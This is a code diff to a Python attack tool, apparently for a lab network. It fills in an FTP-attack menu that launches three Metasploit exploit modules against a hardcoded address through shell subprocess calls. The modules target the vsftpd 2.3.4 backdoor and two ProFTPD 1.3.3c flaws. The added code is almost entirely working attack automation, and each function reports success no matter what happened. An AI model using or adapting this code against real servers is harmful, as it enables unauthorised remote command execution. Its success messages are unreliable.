@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, TCP, ICMP
+import subprocess
 
 
 def attack_to_perform(number):
@@ -78,7 +79,59 @@ def perform_dos(ip_addr=None):
 
 # (6) Code to perform ftp attack
 def perform_ftp_attack():
-    return "ftp attack performed"
+    fsIP = "192.168.200.55"
+
+    print("(1) Exploit the vsftpd 2.3.4 backdoor vulnerability")
+    print("(2) Exploit the ProFTPD 1.3.3c mod_copy command execution vulnerability")
+    print("(3) Exploit the ProFTPD 1.3.3c backdoor command execution vulnerability")
+    # Get input from the user
+    choice = input("Enter the number of the attack to perform: ")
+
+    if choice == "1":
+        return exploit_vsftpd_backdoor(fsIP)
+    elif choice == "2":
+        return exploit_proftpd_modcopy(fsIP)
+    elif choice == "3":
+        return exploit_proftpd_backdoor(fsIP)
+    else:
+        print("Invalid choice\n")
+        return perform_ftp_attack()
+
+
+def exploit_vsftpd_backdoor(ip_addr):
+    # Define the Metasploit command to exploit the vsftpd 2.3.4 backdoor vulnerability
+    metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; run'"
+
+    try:
+        # Execute the Metasploit command using subprocess
+        subprocess.run(metasploit_command, shell=True)
+        return "Exploit executed successfully."
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+
+
+def exploit_proftpd_modcopy(ip_addr):
+    # Define the Metasploit command to exploit the ProFTPD 1.3.3c mod_copy command execution vulnerability
+    metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; run'"
+
+    try:
+        # Execute the Metasploit command using subprocess
+        subprocess.run(metasploit_command, shell=True)
+        return "Exploit executed successfully."
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+
+
+def exploit_proftpd_backdoor(ip_addr):
+    # Define the Metasploit command to exploit the ProFTPD 1.3.3c backdoor command execution vulnerability
+    metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {ip_addr}; run'"
+
+    try:
+        # Execute the Metasploit command using subprocess
+        subprocess.run(metasploit_command, shell=True)
+        return "Exploit executed successfully."
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
 
 
 # (7) Code to perform ip address sweep
